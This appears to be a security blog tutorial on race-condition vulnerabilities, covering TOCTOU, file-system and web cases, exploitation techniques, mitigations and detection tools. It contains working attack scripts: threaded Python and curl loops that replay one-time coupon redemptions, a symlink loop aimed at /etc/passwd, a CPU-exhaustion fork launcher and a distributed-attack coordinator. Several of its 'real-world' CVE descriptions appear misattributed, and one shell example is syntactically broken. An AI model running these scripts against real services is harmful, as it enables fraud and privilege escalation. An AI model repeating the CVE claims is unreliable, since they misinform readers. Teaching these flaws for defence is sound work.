---
layout: post
title: Race Condition
date: 2025-04-10 17:30 +0300
category: [Web Security, Server-side]
---

## Introduction

Race conditions are security vulnerabilities that occur when the timing of events affects the correct operation of a system or application. They happen when multiple processes or threads access and manipulate shared data concurrently, and the final outcome depends on the specific order in which the operations are executed. Race conditions can lead to data corruption, application crashes, privilege escalation, or complete system compromise.

## Types of Race Conditions

### Time-of-Check to Time-of-Use (TOCTOU)

A TOCTOU race condition occurs when there's a time gap between checking a condition (verification) and using the results of that check (use).

```
1. Program checks if a file exists (time-of-check)
2. Time delay occurs
3. Program uses the file, assuming it still exists or has the same properties (time-of-use)
```

### Shared Memory Race Conditions

These occur when multiple threads or processes access and modify shared memory without proper synchronization.

```python
# Unsynchronized counter increment
counter = 0

def increment():
    global counter
    temp = counter    # Read
    temp += 1         # Modify
    counter = temp    # Write

# If two threads run increment() simultaneously,
# counter might only increment by 1 instead of 2
```

### Atomicity Violation

When operations that should be executed as a single atomic unit are interrupted.

```python
# Should be atomic but isn't
def transfer_funds(from_account, to_account, amount):
    if from_account.balance >= amount:    # Check balance
        from_account.balance -= amount    # Debit
        to_account.balance += amount      # Credit
```

### File System Race Conditions

```bash
# Vulnerable shell script
if [ ! -f "/tmp/file" ]; then
    echo "secret data" > /tmp/file    # Create file with sensitive data
fi
chmod 600 /tmp/file                  # Set restrictive permissions
```

### Web Application Race Conditions

```javascript
// Redeeming a coupon code that can only be used once
app.post('/redeem-coupon', (req, res) => {
    const code = req.body.code;
    
    // Check if code is valid
    const coupon = db.findCoupon(code);
    if (!coupon || coupon.redeemed) {
        return res.status(400).send('Invalid or used coupon');
    }
    
    // Mark as redeemed
    db.markCouponRedeemed(code);
    
    // Apply discount
    applyDiscount(req.user, coupon.value);
    
    res.send('Coupon applied successfully');
});
```

## Race Condition Attack Scenarios

### Web Application Attacks

#### 1. Account Balance Manipulation

```
1. User has $100 in account
2. User initiates multiple simultaneous withdrawals of $100
3. Application checks balance for each request before any are completed
4. All requests pass the validation check
5. Multiple withdrawals succeed, creating negative balance
```

#### 2. Coupon/Promo Code Reuse

```
1. One-time coupon code "DISCOUNT50"
2. User sends multiple simultaneous requests to redeem the code
3. Application validates code before marking it as used
4. Multiple requests get the discount
```

#### 3. Rate Limiting Bypass

```
1. API limits users to 100 requests per day
2. Attacker makes multiple concurrent requests
3. Counter increments after request processing
4. Attacker bypasses rate limit
```

### File Operation Attacks

#### 1. Symlink Attacks

```bash
# Target script that processes uploaded files
process_file() {
    # Check if file exists in /tmp/uploads
    if [ -f "/tmp/uploads/$1" ]; then
        # Process file and move to permanent storage
        cp "/tmp/uploads/$1" "/var/data/processed/$1"
    }
}

# Attacker exploitation
ln -s /etc/passwd /tmp/uploads/malicious_file
# When process_file runs, it may copy /etc/passwd
```

#### 2. Temporary File Exploitation

```bash
# Vulnerable code creating temporary file
temp_file=$(mktemp /tmp/app.XXXXXX)
chmod 644 $temp_file
# ... time gap ...
echo "sensitive data" > $temp_file
chmod 600 $temp_file  # Too late, content might have been read
```

### Privilege Escalation

```c
// SUID binary with race condition
int main() {
    if (access("/path/to/file", W_OK) == 0) {  // Check if user can write
        // User has permission, open file as privileged user
        int fd = open("/path/to/file", O_WRONLY);
        // Write to file with elevated privileges
    }
}

// Between access() and open(), attacker replaces file with symlink to /etc/passwd
```

## Exploitation Techniques

### Multi-threading Exploitation

```python
# Python script to exploit race condition in web app
import threading
import requests

url = "https://vulnerable-site.com/api/redeem-coupon"
data = {"code": "DISCOUNT50"}
headers = {"Cookie": "session=user_session_id"}

def exploit():
    response = requests.post(url, json=data, headers=headers)
    print(response.text)

# Create and start multiple threads
threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()
```

### Parallel HTTP Requests

#### Using Burp Suite Intruder

1. Capture the request in Burp
2. Send to Intruder
3. Clear all payload positions
4. Go to Options tab
5. Set "Number of threads" to maximum (e.g., 20)
6. Set "Request Engine" settings:
   - Concurrent requests: 20
7. Start attack with a single payload repeated multiple times

#### Using curl

```bash
# Bash script for concurrent requests
for i in {1..50}; do
    curl -X POST https://vulnerable-site.com/api/redeem-coupon \
         -H "Content-Type: application/json" \
         -H "Cookie: session=user_session_id" \
         -d '{"code":"DISCOUNT50"}' &
done
wait
```

### File System Race Condition Exploitation

```bash
# Loop to win race condition against file creation
while true; do
    ln -sf /etc/passwd /tmp/target_file 2>/dev/null
done

# In another terminal, monitor for success
tail -f /var/data/processed/target_file
```

### Exploiting CPU Scheduling

```c
// Creating artificial delays to increase race window
#include <unistd.h>

int main() {
    // Fork many processes to consume CPU
    for(int i = 0; i < 100; i++) {
        if(fork() == 0) {
            while(1) { /* Consume CPU */ }
            exit(0);
        }
    }
    
    // Launch exploit when system is under load
    system("./exploit");
    return 0;
}
```

## Advanced Race Condition Techniques

### Database Transaction Exploitation

```sql
-- Transaction with potential race condition
BEGIN TRANSACTION;
SELECT balance FROM accounts WHERE id = 123;
-- Time delay occurs here
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
COMMIT;
```

### Distributed Race Conditions

```python
# Using multiple machines to attack
import requests
from concurrent.futures import ThreadPoolExecutor
import socket

# List of attack machines
machines = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"]

def remote_attack(ip):
    # Connect to remote attacker machine
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 4444))
        # Signal to start attack
        s.send(b"ATTACK")

# Coordinate distributed attack
with ThreadPoolExecutor(max_workers=len(machines)) as executor:
    executor.map(remote_attack, machines)
```

### Blind Race Condition Exploitation

When you cannot directly observe the outcome of the race:

```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor

target_url = "https://vulnerable-site.com/api/create-account"
probe_url = "https://vulnerable-site.com/api/account-info"

def create_attempt(username):
    data = {"username": username, "password": "Password123"}
    return requests.post(target_url, json=data)

def check_success(username):
    resp = requests.get(f"{probe_url}?username={username}")
    return resp.status_code == 200

# Launch multiple creation attempts
username = "admin_account"
with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(lambda _: create_attempt(username), range(50))

# Check if any attempt succeeded
time.sleep(2)
if check_success(username):
    print("Race condition successfully exploited!")
```

## Mitigation Techniques

### Locking Mechanisms

```python
# Python threading lock example
import threading

lock = threading.Lock()
counter = 0

def safe_increment():
    global counter
    with lock:  # Acquire lock
        temp = counter
        temp += 1
        counter = temp
    # Lock is automatically released
```

### Database Transactions & Isolation

```sql
-- Serializable transaction to prevent race conditions
BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;
SELECT balance FROM accounts WHERE id = 123 FOR UPDATE;
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
COMMIT;
```

### Atomic Operations

```javascript
// Using atomic increment in MongoDB
db.collection.updateOne(
    { _id: userId },
    { $inc: { credits: -10 } }  // Atomic decrement
);

// Compare-and-swap pattern
db.collection.updateOne(
    { _id: userId, credits: { $gte: 10 } },  // Check balance
    { $inc: { credits: -10 } }  // Only update if check passes
);
```

### Proper File Operation Sequence

```python
import os
import tempfile

# Safe temporary file creation
fd, path = tempfile.mkstemp()
try:
    with os.fdopen(fd, 'w') as tmp:
        # Write to already-created file descriptor
        tmp.write('sensitive data')
    # File already has restrictive permissions from mkstemp()
finally:
    os.remove(path)
```

### Idempotent Operations

```javascript
// Idempotent API using a unique identifier
app.post('/api/payment', (req, res) => {
    const { amount, idempotencyKey } = req.body;
    
    // Check if this operation was already processed
    const existingPayment = db.findPaymentByIdempotencyKey(idempotencyKey);
    if (existingPayment) {
        return res.json(existingPayment);
    }
    
    // Process new payment
    const paymentResult = processPayment(amount);
    
    // Store with idempotency key
    db.savePayment(paymentResult, idempotencyKey);
    
    return res.json(paymentResult);
});
```

## Race Condition Detection Tools

### Manual Testing Tools

1. **Burp Suite Turbo Intruder** - Extension for high-volume request automation
2. **Race the Web** - Tool specifically designed for race condition testing
   - https://github.com/TheHackerDev/race-the-web
3. **OWASP ZAP** - Can be used with scripts to test race conditions

### Automated Analysis

1. **ThreadSanitizer (TSAN)** - For detecting race conditions in C/C++/Go code
   ```bash
   # Compile with ThreadSanitizer
   gcc -fsanitize=thread -g -O1 program.c -o program
   ```

2. **Java PathFinder** - For finding concurrency issues in Java code
3. **Helgrind** - Valgrind tool for detecting synchronization errors
   ```bash
   valgrind --tool=helgrind ./program
   ```

### Static Analysis Tools

1. **Coverity** - Commercial static analyzer with race detection
2. **Fortify** - Can detect certain race conditions
3. **CodeQL** - Supports race condition detection queries:

```
   import cpp
   import semmle.code.cpp.dataflow.TaintTracking

   class FileToctouVulnerability extends TaintTracking::Configuration {
     FileToctouVulnerability() { this = "FileToctouVulnerability" }
     
     override predicate isSource(DataFlow::Node source) {
       exists(FunctionCall fc |
         fc.getTarget().getName() = "access" and
         source.asExpr() = fc.getArgument(0)
       )
     }
     
     override predicate isSink(DataFlow::Node sink) {
       exists(FunctionCall fc |
         fc.getTarget().getName() = "open" and
         sink.asExpr() = fc.getArgument(0)
       )
     }
   }
```

## Real-World Race Condition Examples

### CVE-2022-26485: Firefox Race Condition

A race condition in Firefox allowed remote attackers to execute arbitrary code via crafted JavaScript. The issue was in the browser's handling of certain DOM objects during garbage collection.

### CVE-2020-15778: OpenSSH Race Condition

A race condition in OpenSSH's SFTP server implementation could allow malicious SFTP clients to perform unauthorized file operations.

### CVE-2019-11764: WordPress Race Condition

WordPress suffered from a race condition vulnerability in its installation process that could lead to privilege escalation.

### Signal's Account Creation Race Condition (2020)

Security researchers discovered a race condition in Signal's account creation process that could allow attackers to hijack accounts by requesting multiple verification codes simultaneously.

### HackerOne Race Condition (2016)

A security researcher discovered a race condition in HackerOne that allowed him to change the username of another user by sending multiple requests to update the username.

## Best Practices for Prevention

1. **Design for Concurrency**
   - Identify shared resources early in design
   - Document thread-safety requirements
   - Use thread-safe data structures and patterns

2. **Follow Secure Coding Guidelines**
   - Use atomic operations where available
   - Check then act pattern should be atomic
   - Avoid time gaps between validation and use
   - Use dedicated libraries for concurrent operations

3. **Transaction Management**
   - Use proper isolation levels
   - Keep transactions short
   - Implement retry logic for conflicts

4. **File System Operations**
   - Use secure temporary file creation
   - Avoid symlink vulnerabilities with absolute paths
   - Use file descriptors instead of paths when possible

5. **API Design**
   - Implement idempotency keys
   - Use optimistic concurrency control
   - Design stateless services where possible

## References

1. [OWASP: Race Conditions](https://owasp.org/www-community/vulnerabilities/Race_Conditions)
2. [PortSwigger: Race Conditions](https://portswigger.net/web-security/race-conditions)
3. [CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')](https://cwe.mitre.org/data/definitions/362.html)
4. [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
5. [SANS: Race Condition Exploitation](https://www.sans.org/blog/race-condition-exploitation/)
6. [HackTricks: Race Condition](https://book.hacktricks.xyz/pentesting-web/race-condition)


